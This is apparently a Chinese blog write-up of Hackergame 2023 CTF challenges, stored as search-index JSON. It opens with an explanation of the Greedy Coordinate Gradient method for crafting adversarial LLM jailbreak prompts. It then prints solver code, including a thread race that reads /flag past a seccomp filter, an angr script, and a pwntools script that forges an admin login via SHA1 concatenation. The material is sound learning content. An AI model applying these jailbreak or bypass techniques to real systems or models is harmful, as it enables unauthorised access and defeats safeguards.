\u4f46\u662f\u4e0e\u5e38\u89c1\u7684\u56fe\u7247\u4e0a\u9762\u7684\u5bf9\u6297\u6837\u672c\u653b\u51fb\u4e0d\u540c\uff0cLLM \u7684\u8f93\u5165\u662f\u76f8\u5bf9\u79bb\u6563\u7684 token\uff0c\u65e0\u6cd5\u8fdb\u884c\u8fde\u7eed\u7684\u53d8\u5316\u3002\u56e0\u6b64\u4f5c\u8005\u6839\u636e AutoPrompt [1]\uff0c\u8bbe\u8ba1\u4e86 Greedy Coordinate Gradient \u6765\u5c3d\u53ef\u80fd\u9ad8\u6548\u5730\u5bf9\u79bb\u6563\u7684\u8f93\u5165\u8fdb\u884c\u4f18\u5316\u3002 \u901a\u4fd7\u6765\u8bb2\uff0c\u6211\u4eec\u5e0c\u671b\u80fd\u591f\u5c06\u539f\u6709\u8f93\u5165\u7684 Prompt \u4e2d\u7684\u67d0\u4e00\u4e9b token \u66ff\u6362\u4e3a\u65b0\u7684 token\uff0c\u5e76\u4e14\u8ba9\u66ff\u6362\u4e4b\u540e\u5c3d\u53ef\u80fd\u8ba9\u8f93\u51fa\u7684 target loss \u5c3d\u53ef\u80fd\u964d\u4f4e\u3002 \u4f5c\u8005\u7528\u4e00\u4e2a\u957f\u5ea6\u4e3a \\(V\\) \u7684 one hot \u5411\u91cf\u6765\u4ee3\u8868\u5f53\u524d\u4f4d\u7f6e\u7684 token\uff0c\u8be5 one hot \u5411\u91cf\u4e0e embedding layer\uff08\u5927\u5c0f\u4e3a \\(R^{\\mathrm{dim} \\times V}\\) \uff09\u76f8\u4e58\u540e\u53ef\u4ee5\u5f97\u5230\u8be5 token \u5bf9\u5e94\u7684 embedding\uff0c\u8be5 embedding \u88ab\u8f93\u5165\u7ed9\u4e86\u6a21\u578b\u3002\u5728\u53cd\u5411\u4f20\u64ad\u540e\uff0cone hot \u5411\u91cf\u7684\u6bcf\u4e00\u4e2a\u4f4d\u7f6e \\(i\\) \u90fd\u6709\u5bf9\u5e94\u7684\u68af\u5ea6 \\(\\mathrm{grad}_i\\) \uff0c \\(\\mathrm{grad}_i < 0\\) \u8bf4\u660e\u5982\u679c\u5c06\u539f\u672c\u7684 token \u66ff\u6362\u4e3a\u8bcd\u8868\u4e2d\u7684\u7b2c \\(i\\) \u4e2a token\uff0c\u80fd\u591f\u4f7f\u5f97\u8f93\u51fa\u7684 loss \u4e0b\u964d\u3002 \u57fa\u4e8e\u8fd9\u4e2a\u68af\u5ea6\uff0c\u6211\u4eec\u9009\u51fa\u4e86 top-k \u4e2a\u6700\u5c0f\u7684\u66ff\u6362 token\uff08\u7b97\u6cd5\u7684\u7b2c 4 \u884c\uff09\u3002\u7136\u540e\u6211\u4eec\u968f\u673a\u9009\u62e9 prompt \u7684 token \u7684\u4f4d\u7f6e\uff0c\u5c06\u5176\u968f\u673a\u66ff\u6362\u4e3a\u68af\u5ea6\u6700\u5c0f\u7684 k \u4e2a\u4e4b\u4e00\u3002\u91cd\u590d\u4e0a\u8ff0\u66ff\u6362\u591a\u6b21\uff0c\u9009\u62e9\u51fa\u66ff\u6362\u540e loss \u6700\u5c0f\u7684 prompt \u4f5c\u4e3a\u4e0b\u4e00\u6b21\u8fed\u4ee3\u7684\u521d\u59cb\u503c\u3002 [1]: AutoPrompt: Eliciting Knowledge from Language Models with Automatically Generated Prompts. https://arxiv.org/abs/2010.15980 \ud83e\ude90 \u6d41\u5f0f\u661f\u7403 \u00b6 \u9700\u8981\u77e5\u9053\u56fe\u50cf\u7684\u957f\u5bbd\uff0c\u600e\u4e48\u529e\u5462\uff1f\u624b\u52a8plot\u51fa\u6765\u770b\u5457\uff0c\u53cd\u6b63\u8bd5\u4e00\u4e0b\u5f88\u5bb9\u6613\u627e\u5230\u5468\u671f\u6027\u91cd\u590d\u7684\u4e1c\u897f\uff0c\u7136\u540e\u5fae\u8c03\u4e00\u4e0b\u5f97\u5230\u957f\u5bbd\uff0c\u76f4\u63a5\u8f93\u51fa\u89c6\u9891\u5373\u53ef\u3002 \u89e3\u9898\u4ee3\u7801 import cv2 import numpy as np def restore_video ( buffer , output ): frame_width = 427 frame_height = 759 frame_count = 139 video_writer = cv2 . VideoWriter ( output , cv2 . VideoWriter_fourcc ( * \"mp4v\" ), 30.0 , ( frame_width , frame_height )) for i in range ( frame_count ): frame = buffer [ i ] . astype ( np . uint8 ) video_writer . write ( frame ) video_writer . release () if __name__ == \"__main__\" : with open ( \"video.bin\" , \"rb\" ) as input_file : buffer = np . fromfile ( input_file , dtype = np . uint8 ) print ( buffer . shape ) num = [ 2 , 5 , 8 , 11 , 14 , 17 , 20 , 23 , 26 , 29 , 32 , 35 , 38 , 41 , 44 , 47 , 50 , 53 , 56 , 59 , 62 , 65 , 68 , 71 , 74 , 77 , 80 , 83 , 86 , 89 , 92 , 95 , 98 ] nums = [] f = np . append ( buffer , np . zeros ( 93 , dtype = np . uint8 )) f = f . reshape (( - 1 , 759 , 427 , 3 )) restore_video ( f , \"video.mp4\" ) \ud83e\ude90 \u4f4e\u5e26\u5bbd\u661f\u7403 \u00b6 \u8fd9\u4e00\u9898\u7b2c\u4e00\u95ee\u6ca1\u4ec0\u4e48\u95ee\u9898\uff0c\u968f\u4fbf\u538b\u7f29\u4e00\u4e0b\u5c31\u80fd\u8fc7\u3002\u7b2c\u4e8c\u9898\u6709\u70b9\u6298\u78e8\uff0c\u601d\u8def\u662f\u5bf9\u7684\uff0c\u53bb\u627e libvips \u652f\u6301\u7684\u56fe\u50cf\u683c\u5f0f\uff0c\u5c31\u662f\u6211\u592a\u61d2\u4e86\u6ca1\u53bb\u4ed4\u7ec6\u7ffb\uff0c\u4e00\u4e2a\u52b2\u5730\u7422\u78e8SVG\u53bb\u4e86\uff0c\u5bfc\u81f4\u6ca1\u505a\u51fa\u6765\uff0c\u5f88\u53ef\u60dc\u3002\u8fd9\u9053\u9898\u7528JXL\u7684\u683c\u5f0f\u6765\u89e3\u7684\u3002 Komm, s\u00fcsser Flagge \u00b6 \u8fd9\u9053\u9898\u5c31\u662f\u5bf9TCP/IP\u6570\u636e\u5305\u7684\u4fee\u6539\uff0c\u7b2c\u4e00\u95ee\u76f4\u63a5\u4e00\u4e2a\u5b57\u8282\u4e00\u4e2a\u5b57\u8282\u53d1\u9001\u5373\u53ef\u7ed5\u8fc7\uff0c\u7b2c\u4e8c\u95ee\u5176\u5b9e\u975e\u9884\u671f\u4e86\uff0c\u56e0\u4e3a\u4e00\u4e2a\u5b57\u8282\u6ca1\u6709\u5230u32\u7684\u8981\u6c42\uff0c\u76f4\u63a5\u7ed5\u8fc7\u4e86hhh\u3002 \u7b2c\u4e09\u95ee\u601d\u8def\u5176\u5b9e\u5bf9\u4e86\uff0c\u5c31\u662f\u4fee\u6539TCP\u4e2d\u7684OPTION\u90e8\u5206\uff0c\u4e0d\u8fc7\u5f53\u65f6\u5f88\u5fd9\uff0c\u7528python\u5199\u7684\u6709\u70b9\u5947\u602a\uff0c\u6ca1\u7ec6\u8c03\uff0c\u5982\u679c\u7a7a\u95f2\u7684\u8bdd\u5e94\u8be5\u505a\u51fa\u6765\u6ca1\u95ee\u9898\u3002 \u4e3a\u4ec0\u4e48\u8981\u6253\u5f00 /flag \ud83d\ude21 \u00b6 \u7b2c\u4e00\u95ee\u5f88easy\u76f4\u63a5\u9759\u6001\u7f16\u8bd1\u540e\u63d0\u4ea4\u5373\u53ef\u3002\u7b2c\u4e8c\u95ee\u770b\u4e86\u5b98\u65b9\u9898\u89e3\u4e4b\u540e\uff0c\u77e5\u9053\u8981\u591a\u770b\u6ce8\u91ca\uff0c\u7528\u7ebf\u7a0b\u7684\u65b9\u5f0f\u6765\u7ed5\u8fc7seccomp\uff0c\u5b66\u4e60\u4e86\u3002 \u5b98\u65b9\u9898\u89e3 #include <stdio.h> #include <pthread.h> #include <fcntl.h> #include <unistd.h> #include <stdlib.h> #include <time.h> char flagfile [] = \"/flag\" ; void * read_file () { char buf [ 100 ] = {}; while ( 1 ) { int f = open ( flagfile , O_RDONLY ); if ( ! f ) { continue ; } read ( f , buf , 99 ); if ( buf [ 0 ] && buf [ 0 ] != 'I' ) { printf ( \"%s \\n \" , buf ); exit ( 0 ); } close ( f ); } } void * modify () { struct timespec req ; req . tv_sec = 0 ; req . tv_nsec = 50 ; while ( 1 ) { flagfile [ 1 ] = 'a' ; // sleep is not allowed. So just don't sleep. // nanosleep(&req, NULL); flagfile [ 1 ] = 'f' ; } } int main () { printf ( \"pthread \\n \" ); pthread_t t1 , t2 ; pthread_create ( & t1 , NULL , read_file , NULL ); pthread_create ( & t2 , NULL , modify , NULL ); pthread_join ( t1 , NULL ); pthread_join ( t2 , NULL ); printf ( \"done? \\n \" ); return 0 ; } \u5f02\u661f\u6b67\u9014 \u00b6 \u5f88\u597d\u73a9\u7684\u5c0f\u6e38\u620f\uff0c\u5c31\u5f53\u653e\u677e\u4e00\u4e0b\uff0c\u903b\u8f91\u5f88\u7b80\u5355\uff08\u5c0f\u5fc3\u7206\u70b8\uff0c\u7b2c\u4e00\u6b21\u5fd8\u8bb0\u5148\u901a\u51b7\u5374\u6db2\u4e86 \u5fae\u79ef\u5206\u8ba1\u7b97\u5c0f\u7ec3\u4e60 2.0 \u00b6 \u8fd9\u9053\u9898\u5f88\u70e6\uff0c\u5c31\u662f\u611f\u89c9\u81ea\u5df1\u5feb\u505a\u51fa\u6765\u4e86\uff0c\u5c31\u5dee\u4e00\u70b9\u70b9\uff0c\u6240\u4ee5\u9700\u8981\u603b\u7ed3\u4e00\u4e0b\u7ecf\u9a8c\u6559\u8bad\u3002 \u5176\u5b9e\u4e5f\u6ca1\u4ec0\u4e48\u597d\u603b\u7ed3\u7684\uff0c\u5c31\u662f\u6ca1\u6ce8\u610f\u5230 updateElement \uff0c\u5bfc\u81f4\u4e0d\u77e5\u9053\u600e\u4e48\u7ed5\u8fc7\u957f\u5ea6\u9650\u5236\u3002\u4e5f\u662f\u81ea\u5df1\u83dc\uff0c\u5176\u5b9e\u6ca1\u600e\u4e48\u505a\u8fc7XSS\u7684\u9898\u76ee\uff0c\u8fd8\u662f\u9700\u8981\u79ef\u7d2f\u7ecf\u9a8c\uff0c\u611f\u89c9\u597d\u7684XSS\u9898\u76ee\u4e0d\u591a\u3002 \u9006\u5411\u5de5\u7a0b\u4e0d\u9700\u8981 F5 \u00b6 \u8fd9\u9053\u9898\u8bb0\u5f55\u4e00\u4e0b\uff0c\u56e0\u4e3a\u9006\u5411\u7684\u9898\u76ee\u505a\u5f97\u5c11\uff0c\u6240\u4ee5\u9700\u8981\u79ef\u7d2f\u4e00\u4e0b\u3002 \u5b98\u65b9\u9898\u89e3\u4e2d\u9700\u8981\u8bb0\u5f55\u7684\u4e60\u60ef import angr , monkeyhex , claripy proj = angr . Project ( 'no_need_for_F5/main.exe' ) flag_chars = [ claripy . BVS ( 'flag_ %d ' % i , 8 ) for i in range ( 32 )] flag = claripy . Concat ( * [ claripy . BVV ( b 'flag{' )] + flag_chars + [ claripy . BVV ( b '} \\x00 ' )]) state = proj . factory . call_state ( 0x140001000 ) input_addr = 0 @proj . hook ( 0x140001093 , length = 5 ) def get_input ( state ): global input_addr input_addr = state . regs . rdx state . memory . store ( input_addr , flag ) print ( 'Input done' ) @proj . hook ( 0x140001079 , length = 5 ) def printf ( state ): return simgr = proj . factory . simgr ( state ) simgr . explore ( find = 0x1400013A1 , avoid = 0x1400013B7 ) simgr . found [ 0 ] . solver . eval ( flag ) . to_bytes ( 39 , \"big\" ) O(1) \u7528\u6237\u767b\u5f55\u7cfb\u7edf \u00b6 \u6839\u636e\u54c8\u5e0c\u4e66\u7684\u7279\u6027\uff0c\u56e0\u6b64\u6211\u4eec\u53ea\u9700\u8981\u6784\u9020\u4e00\u4e2a\u7528\u6237\uff0c\u4f7f\u5f97\u5b83\u7684SHA1\u503c\u7b49\u4ef7\u4e8e\u5176\u5b50\u8282\u70b9\u5b58\u5728admin\u7528\u6237\u5373\u53ef\u3002\u8fd9\u91cc\u6ce8\u610f\u9700\u8981SHA1\u503c\u80fd\u591f\u88abUTF-8\u89e3\u7801\u5373\u53ef\u3002 \u8fd9\u91cc\u6211\u5148\u627e\u4e86\u5982\u4e0b\u4e24\u4e2a\u7528\u6237\uff1a admin:aaaadcLd admin:aaaaanRH \u8fd9\u91cc\u5176\u5b9e\u53ef\u4ee5\u968f\u4fbf\u641c\u7d22\uff0c\u4e0b\u9762\u90fd\u4ee3\u7801\u6539\u4e00\u4e0b\u90fd\u53ef\u4ee5\u641c\uff0c\u968f\u4fbf\u641c\u3002 \u641c\u7d22\u5408\u9002\u7684admin\u7528\u6237 from itertools import product str1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' prefix = 'admin:' for i in product ( str1 , repeat = 8 ): user = prefix + '' . join ( i ) x = f ( user . encode ()) # x = com(x, x) if b ':' not in x : try : x . decode () print ( user , x ) except : pass \u7136\u540e\u5c31\u7b97\u4e00\u4e0bSHA1\u540e\u62fc\u63a5\u5373\u53ef\uff0c\u89e3\u9898\u811a\u672c\u5982\u4e0b\uff1a \u89e3\u9898\u811a\u672c\uff08\u4fee\u6539\u7248\uff0c\u539f\u7248\u592a\u6742\u4e71\u4e86\uff09 from hashlib import sha1 from pwn import * f = lambda data : sha1 ( data ) def com ( x , y ): if isinstance ( x , bytes ): t = x else : t = x . digest () if isinstance ( y , bytes ): p = y else : p = y . digest () if t > p : t , p = p , t return t + p if __name__ == '__main__' : p = remote ( '202.38.93.111' , 10094 ) token = b '2269:MEUCIFS9KtX84tx7Ri01S4JNBKL/H1pJ2+sHChO3/WlK7QsXAiEA5cTIFBDrdJQfvOANFq0hGHLglZHY31APxc62zvSnKug=' p . recvuntil ( 'token:' ) p . sendline ( token ) p . recvuntil ( 'Choice:' ) p . sendline ( b '1' ) def sendu ( data ): p . recvuntil ( '>' ) p . sendline ( data ) test0 = [ b 'admin:aaaadcLd' , b 'admin:aaaaanRH' ] test1 = b 'a:a' test3 = com ( f ( test0 [ 0 ]), f ( test0 [ 1 ])) sendu ( test1 ) sendu ( test3 ) sendu ( b 'EOF' ) p . recvuntil ( 'Choice:' ) p . sendline ( b '2' ) p . recvuntil ( 'Login credential: ' ) p . sendline ( test0 [ 0 ] . decode () + ':' + f ( test0 [ 1 ]) . hexdigest () + sha1 ( test1 ) . hexdigest ()) p . interactive () \u5176\u4ed6 \u00b6 \u540e\u9762\u7684\u9898\u76ee\u5176\u5b9e\u6ca1\u600e\u4e48\u770b\uff0c\u5c31\u6682\u65f6\u5148\u4e0d\u5199\u4e86\uff0c\u7b49\u4ee5\u540e\u6709\u65f6\u95f4\u7a7a\u4e86\u7814\u7a76\u540e\u518d\u8bb0\u5f55\u4e00\u4e0b\u5427\u3002","title":"Hackergame 2023"},{"location":"ctf/writeups/hackergame2023/#hackergame-2023","text":"\u7ea6 3143 \u4e2a\u5b57 222 \u884c\u4ee3\u7801 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 13 \u5206\u949f Abstract \u8fd9\u6b21\u5fd9\u91cc\u5077\u95f2\u505a\u7684\uff0c\u8fd8\u803d\u6401\u4e86\u4e00\u4e9b\u4e8b\u513fqaq\u3002\u7b97\u662f\u7b2c\u4e00\u6b21partly\u5b8c\u6574\u5730\u53c2\u52a0Hackergame\uff0c\u56e0\u4e3a\u662f\u9762\u5411\u521d\u5b66\u8005\u7684\u6bd4\u8d5b\uff0c\u9898\u76ee\u96be\u5ea6\u4e0d\u9ad8\u66f4\u5177\u6709\u8da3\u5473\u6027\uff0c\u7279\u6b64\u8bb0\u5f55\u4e00\u4e0b\u3002 \u4e00\u4e9b\u7b80\u5355\u7684\u9898\u76ee\u53ef\u80fd\u8bb0\u5f55\u7684\u4f1a\u6bd4\u8f83\u8349\u7387\uff0c\u4f1a\u91cd\u70b9\u8bb0\u5f55\u4e00\u4e9b\u5370\u8c61\u6df1\u523b\uff0c\u5dee\u4e00\u70b9\u5b8c\u6210\u7684\u9898\u76ee\u3002\u5bf9\u4e8e\u6ca1\u601d\u8def\u7684\u9898\u76ee\u4e5f\u7ed3\u5408\u516c\u5f00\u9898\u89e3\u8bb0\u5f55\u4e00\u4e0b\uff0c\u8865\u5145\u4e00\u4e0b\u76f8\u5173\u77e5\u8bc6\u3002 \u5b98\u65b9\u9898\u89e3","title":"Hackergame 2023"},{"location":"ctf/writeups/hackergame2023/#hackergame","text":"\u7b7e\u5230\u9898\uff0c\u76f4\u63a5\u6539GET\u8bf7\u6c42\u53c2\u6570\u91cc\u7684Similarity","title":"Hackergame \u542f\u52a8"},{"location":"ctf/writeups/hackergame2023/#_1","text":"\u8003\u9a8c\u641c\u7d22\u80fd\u529b\uff0c\u90fd\u5f88\u597d\u641c\uff0cGoogle\u4e00\u4e0b\u4f60\u5c31\u77e5\u9053","title":"\u732b\u54aa\u5c0f\u6d4b"},{"location":"ctf/writeups/hackergame2023/#_2","text":"\u9047\u4e8b\u4e0d\u51b3 F12\uff0c\u968f\u4fbf\u6eda\u4e00\u4e0b\u5c31\u627e\u5230\u4e86flag\uff08\u771f\u7684\uff0c\u90fd\u662f\u8fd0\u6c14","title":"\u66f4\u6df1\u66f4\u6697"},{"location":"ctf/writeups/hackergame2023/#30","text":"\u8fd8\u86ee\u6709\u610f\u601d\u7684\u793e\u5de5\u9898\uff0c\u8fd8\u662f\u6bd4\u8f83\u7b80\u5355\u7684 \u4ece\u65e5\u672c\u3001\u5b66\u672f\u4f1a\u8bae\u5165\u624b\uff0c\u5f88\u5bb9\u6613\u53d1\u73b0\u4f1a\u8bae\u540d\u79f0\u4ee5\u53ca\u5730\u70b9\u4e3a\u4e1c\u4eac\u5927\u5b66\uff0c\u6839\u636e\u5730\u56fe\u9a8c\u8bc1\u4e00\u4e0b\u5c31\u53d1\u73b0\u4e86\u90a3\u5bb6\u62c9\u9762\u9986\u3002 \u4e8e\u662f\u6839\u636e\u8981\u6c42\u67e5\u4e00\u4e0b\u4f1a\u8bae\u4e3e\u529e\u65e5\u671f\uff0c\u4ee5\u53ca\u4e1c\u4eac\u5927\u5b66\u8bfa\u8d1d\u5c14\u7269\u7406\u5b66\u5956\u83b7\u5f97\u8005\uff0c\u5f88\u5bb9\u6613\u89e3\u51fa\u7b2c\u4e00\u90e8\u5206\u7684\u7b54\u6848\u3002 \u7b2c\u4e8c\u90e8\u5206\u521a\u5f00\u59cb\u5361\u4e86\u5f88\u4e45\uff0c\u6ca1\u60f3\u5230\u9644\u8fd1\u8d70\u8d70\u5c45\u7136\u8d70\u90a3\u4e48\u8fdc\uff0c\u8fd8\u662f\u9760\u4e0a\u91ce\u7ad9\u8fd9\u4e00\u4e2a\u5173\u952e\u5730\u70b9\u624d\u53d1\u73b0\u539f\u6765\u8d70\u4e86\u90a3\u4e48\u8fdc\uff0c\u90a3\u5c31\u5f88\u597d\u5b9a\u4f4d\u5230\u56fd\u7acb\u535a\u7269\u9986\u548c\u4e0a\u91ce\u516c\u56ed\u3002\u6839\u636e\u65e5\u671f\u548c\u5730\u70b9\u80fd\u641c\u5230\u4e00\u4e2a\u9152\u7684\u5c55\u89c8\u4f1a\uff0c\u7f51\u7ad9\u91cc\u627e\u5230Staff\u62db\u52df\uff0c\u7b2c\u4e8c\u90e8\u5206\u5c31\u5b8c\u6210\u4e86\u3002 \u7b2c\u4e09\u90e8\u5206\u7b2c\u4e00\u95ee\u76f4\u63a5\u770b\u4f1a\u8bae\u5b98\u7f51\u7684\u901a\u77e5\u5373\u53ef\uff0c\u7b2c\u4e8c\u90e8\u5206\uff0c\u6d77\u62a5\u76f4\u63a5\u4e0aTwitter\u641c\u4e86\u4e00\u4e0b\u5c31\u51fa\u6765\u4e86\u3002\u5173\u4e8e 3D \u52a8\u7269\u7684\u8bdd\u80af\u5b9a\u6709\u76f8\u5173\u62a5\u9053\uff0c\u67e5\u4e86\u4e00\u4e0b\u6709\u732b\u6709\u72d7\uff0c\u8bd5\u4e00\u4e0b\u5c31\u51fa\u6765\u4e86\u3002","title":"\u65c5\u884c\u7167\u7247 3.0"},{"location":"ctf/writeups/hackergame2023/#_3","text":"\u540e\u7aef\u6ca1\u6709\u505a\u4f4d\u7f6e\u662f\u5426\u5360\u7528\u68c0\u67e5\uff0c\u6240\u4ee5\u53ea\u8981\u7ed5\u8fc7\u524d\u7aef\u68c0\u67e5\u5c31\u80fd\u83b7\u5f97\u80dc\u5229\u3002","title":"\u8d5b\u535a\u4e95\u5b57\u68cb"},{"location":"ctf/writeups/hackergame2023/#flag","text":"\u6839\u636e\u9898\u5e72\u63d0\u5230\u7684 Google\u4eb2\u513f\u5b50 \u731c\u6d4b\u548cPixels\u6709\u5173\uff0c\u5584\u7528\u641c\u7d22\u53d1\u73b0\u662fPixels\u7684\u56fe\u50cf\u88c1\u526a\u6f0f\u6d1e\uff0c\u76f4\u63a5\u5c06PNG\u6587\u4ef6\u7684END\u6570\u636e\u5757\u6dfb\u52a0\u5230\u76f8\u5e94\u4f4d\u7f6e\uff0c\u5e76\u6ca1\u6709\u5220\u9664\u88ab\u88c1\u526a\u7684\u6570\u636e\uff0c\u6240\u4ee5\u53ef\u4ee5\u6839\u636e\u578b\u53f7\u4fee\u6539\u4e00\u4e0b\u957f\u5bbd\u5e76\u5220\u9664\u76f8\u5e94\u6570\u636e\u5757\u5373\u53ef\u3002 \u7f51\u4e0a\u5176\u5b9e\u6709\u76f8\u5e94\u5de5\u5177\u53ef\u4ee5\u4e00\u628a\u68ad\u3002","title":"\u5976\u5976\u7684\u7761\u524d flag \u6545\u4e8b"},{"location":"ctf/writeups/hackergame2023/#_4","text":"\u7ec8\u4e8e\u6709\u4e00\u9053\u9700\u8981\u5199\u811a\u672c\u7684\u9898\u76ee\u4e86\uff08x \u76f4\u63a5F12\u770b\u6e90\u7801\uff0c\u53d1\u73b0\u540e\u7aef\u662f\u4e00\u6b21\u6027\u628a\u6240\u6709\u6d88\u606f\u90fd\u53d1\u8fc7\u6765\uff0c\u90a3\u5c31\u5f88\u7b80\u5355\uff0c\u4e4b\u95f4\u627e\u51fa\u6ee1\u8db3\u8981\u6c42\u7684\u6d88\u606f\u7136\u540e\u53d1\u8d77\u64a4\u56de\u8bf7\u6c42\u5373\u53ef\u3002\u4e0d\u8fc7\u4e0d\u80fd\u4e00\u6b21\u6027\u90fd\u64a4\u56de\uff0c\u540e\u7aef\u6709Delay\u65f6\u95f4\u8981\u6c42\uff0c\u53ef\u4ee5\u6839\u636e\u6d88\u606f\u5185\u7684Delay\u4fe1\u606f\u5ef6\u8fdf\u540e\u53d1\u9001\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u4e00\u76f4\u53d1\u9001\u76f4\u5230\u6210\u529f\u5373\u53ef\uff08\u4e3b\u8981\u7701\u529b\u65e0\u8111 \u89e3\u9898\u4ee3\u7801\uff08\u614e\u7528\uff0c\u6982\u7387\u4e8b\u4ef6\uff0c\u591a\u8bd5\u51e0\u6b21\u5c31\u597d\uff09 import requests import json from time import sleep cookies = { 'session' : 'token' } msg = requests . post ( 'http://202.38.93.111:10021/api/getMessages' , cookies = cookies ) msg = json . loads ( msg . text ) msg = msg [ 'messages' ] def back ( idx ): back = requests . post ( 'http://202.38.93.111:10021/api/deleteMessage' , cookies = cookies , json = { 'id' : idx }) try : back = json . loads ( back . text ) except : print ( 'err:' + back . text ) return back for id , i in enumerate ( msg ): if 'hack[' in i [ 'text' ]: t = back ( id ) # \u8fd9\u91cc\u53ef\u4ee5\u4f18\u5316\u4e00\u4e0b\uff0c\u4e0d\u8fc7\u61d2\u764c\u72af\u4e86 while ( t . get ( 'error' ) == '\u68c0\u6d4b\u5230\u65f6\u7a7a\u7a7f\u8d8a' ): t = back ( id ) # print(id, t) flag = requests . post ( 'http://202.38.93.111:10021/api/getflag' , cookies = cookies ) flag = json . loads ( flag . text ) print ( flag )","title":"\u7ec4\u59d4\u4f1a\u6a21\u62df\u5668"},{"location":"ctf/writeups/hackergame2023/#_5","text":"\u771f\u662f\u975e\u5e38\u5de7\uff0c\u4e4b\u524d\u5c31\u5237\u5230\u8fc7\u65e0\u7ebf\u7535\u3001SSTV\u76f8\u5173\u7684\u77e5\u8bc6\uff0c\u8fd9\u6b21\u5c45\u7136\u521a\u597d\u78b0\u4e0a\u4e86\uff0c\u4e0d\u8fc7Windows\u7aef\u90a3\u4e2a\u8f6f\u4ef6\u4e0d\u600e\u4e48\u4f1a\u7528\uff0c\u770b\u5230\u624b\u673a\u7aef\u6709\u76f8\u5e94\u7684\u50bb\u74dc\u5f0f\u6536\u53d1\u8f6f\u4ef6\uff08\u4e0d\u8fc7\u662fAndroid\uff0c\u4e8e\u662f\u62ff\u51fa\u4e86\u5907\u7528\u673a\uff09\u5f88\u8f7b\u677e\u83b7\u5f97\u4e86\u7ed3\u679c\u3002 \u4e0d\u653e\u56fe\u4e86\uff0c\u5360\u4ed3\u5e93\u7a7a\u95f4\uff0c\u7b49\u4ee5\u540e\u641e\u4e2a\u56fe\u5e8a\u6216SVG","title":"\u866b"},{"location":"ctf/writeups/hackergame2023/#json-yaml","text":"\u5b66\u4e60\u4e86\u4e00\u4e0b Yaml\uff0c\u6839\u636eYaml 1.1\u4e0e1.2\u7684\u5dee\u5f02\uff0c\u53d1\u73b0Yaml 1.1\u65e0\u6cd5\u89e3\u6790\u5f62\u5982 1e3 \u8fd9\u6837\u7684\u6570\u5b57\uff0c\u4f1a\u5c06\u5176\u89e3\u6790\u4e3a\u5b57\u7b26\u4e32\uff0c\u8fd9\u6837\u7b2c\u4e00\u5c0f\u95ee\u5c31\u89e3\u51b3\u4e86\u3002 \u7b2c\u4e8c\u5c0f\u95ee\u6839\u636e\u641c\u7d22\u5f97\u5230 \u8fd9\u4e2a\u95ee\u9898 \u53ef\u77e5\u9053Yaml\u8981\u6c42\u952e\u503c\u662f\u552f\u4e00\u7684\u5426\u5219\u4f1a\u62a5\u9519\uff0c\u800cJSON\u6ca1\u6709\u8fd9\u4e2a\u8981\u6c42\uff0c\u8fd9\u6837\u5c31\u89e3\u5b8c\u4e86\u3002","title":"JSON \u2282 YAML?"},{"location":"ctf/writeups/hackergame2023/#git-git","text":"\u8fd9\u9898\u975e\u5e38\u7684easy\uff0c\u76f4\u63a5 git reflog \uff0c\u518d git reset \u5c31\u7ed3\u675f\u4e86\u3002","title":"Git? Git!"},{"location":"ctf/writeups/hackergame2023/#http","text":"\u5927\u81f4\u5c31\u662f\u4e0d\u65ad\u67e5\u6587\u6863\uff0c\u8fd9\u91cc\u5c31\u76f4\u63a5\u642c\u5b98\u65b9\u9898\u89e3\u4e86 \u5b98\u65b9\u9898\u89e3 200 OK. \u70b9\u51fb\u5c31\u9001\uff0c\u4ee3\u8868\u8bf7\u6c42\u6210\u529f\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 404 Not Found. \u4fee\u6539\u8def\u5f84\u5230\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u6587\u4ef6\u5373\u53ef\u3002 GET /x HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 400 Bad Request. \u6784\u9020\u4e0d\u7b26\u5408\u683c\u5f0f\u7684 HTTP \u8bf7\u6c42\u5373\u53ef\u3002 GET / aHTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 505 HTTP Version Not Supported. \u4fee\u6539 HTTP \u7248\u672c\u53f7\u5230\u4e00\u4e2a\u79bb\u8c31\u7684\u503c\u5373\u53ef\u3002 GET / HTTP/11\\r\\n Host: example.com\\r\\n\\r\\n 405 Method Not Allowed. \u4fee\u6539\u8bf7\u6c42\u65b9\u6cd5\u5230 POST \u7b49\u5373\u53ef\u3002 POST / HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n \u63a5\u4e0b\u6765\u662f\u53ef\u80fd\u9700\u8981\u770b\u6587\u6863\u7684\u90e8\u5206\uff1a 100 Continue. \u4ee3\u8868\u670d\u52a1\u5668\u5e0c\u671b\u5ba2\u6237\u7aef\u7ee7\u7eed\u8bf7\u6c42\u6216\u8005\u5ffd\u7565\u3002\u9700\u8981\u5ba2\u6237\u7aef\u53d1\u9001 Expect: 100-continue \u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Expect: 100-continue\\r\\n\\r\\n 206 Partial Content. \u4e00\u4e2a HTTP \u8bf7\u6c42\u53ef\u4ee5\u53ea\u8bf7\u6c42\u90e8\u5206\u5185\u5bb9\uff0c\u670d\u52a1\u5668\u4e5f\u4f1a\u8fd4\u56de\u90e8\u5206\u5185\u5bb9\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Range: bytes=1-2\\r\\n\\r\\n 416 Range Not Satisfiable. \u4e0a\u9762\u7684 Range \u662f\u4e00\u4e2a\u5408\u6cd5\u7684\u8303\u56f4\uff0c\u90a3\u4e48\u4e0d\u5408\u6cd5\u7684\u8303\u56f4\u5462\uff1f\u5c31\u662f 416\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Range: bytes=114514-1919810\\r\\n\\r\\n 304 Not Modified. \u4ee3\u8868\u6587\u4ef6\u5728\u6307\u5b9a\u6761\u4ef6\u4e0b\u6ca1\u6709\u4fee\u6539\u8fc7\uff0c\u8fd9\u91cc\u7528 If-Modified-Since \uff1a GET / HTTP/1.1\\r\\n Host: example.com\\r\\n If-Modified-Since: Tue, 15 Aug 2023 17:03:04 GMT\\r\\n\\r\\n 412 Precondition Failed. \u8fd9\u4e2a payload \u4f7f\u7528\u4e86 ETag + If-Match\uff0cETag \u548c\u5bf9\u5e94\u7684 web 